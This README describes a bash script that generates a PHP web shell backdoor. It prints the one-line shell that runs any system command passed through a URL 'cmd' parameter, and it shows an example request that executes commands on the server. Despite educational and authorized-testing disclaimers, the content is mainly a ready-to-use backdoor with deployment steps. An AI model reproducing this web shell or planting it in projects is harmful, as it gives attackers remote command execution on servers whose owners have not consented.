# Backdoor-PHP-maker

This is a simple bash script that creates a PHP file that allows remote execution of system commands. The generated PHP file contains a backdoor, which can be used to run arbitrary shell commands via a URL query parameter. 

**WARNING**: This script is potentially dangerous and should not be used in production environments or on unauthorized systems. It is provided for educational purposes only. Misuse of this script may be illegal and unethical.

## Features

- Prompts the user to input a filename.
- Creates a PHP file with the name specified by the user.
- The generated PHP file contains a remote command execution vulnerability, where an attacker can execute arbitrary system commands by providing a `cmd` parameter in the URL.

## How it works

1. The script prints a message indicating the creation of a backdoor.
2. The user is prompted to enter a filename for the PHP file to be created.
3. The PHP file is created with the following content:
    ```php
    <?php system($_GET["cmd"]); ?>
    ```
4. The script writes this content into a `.php` file with the name specified by the user.

### Example Usage

If you run the script and input `backdoor`, it will create a file called `backdoor.php` with the following content:
```php
<?php system($_GET["cmd"]); ?>
This file can be accessed via a URL like:

bash
Copy code
http://<yourserver>/backdoor.php?cmd=ls
This would execute the ls command on the server, displaying the contents of the current directory.

DISCLAIMER
This script is NOT intended for malicious use. Use this only in controlled environments, such as penetration testing or educational labs, where you have explicit permission to test for vulnerabilities. Unauthorized access to systems is illegal.

To use:
Clone this repository or copy the script to your local machine.
Run the script on a Linux/Unix-based server with bash and PHP installed.
Enter a filename when prompted. The script will create a .php file with the specified name.
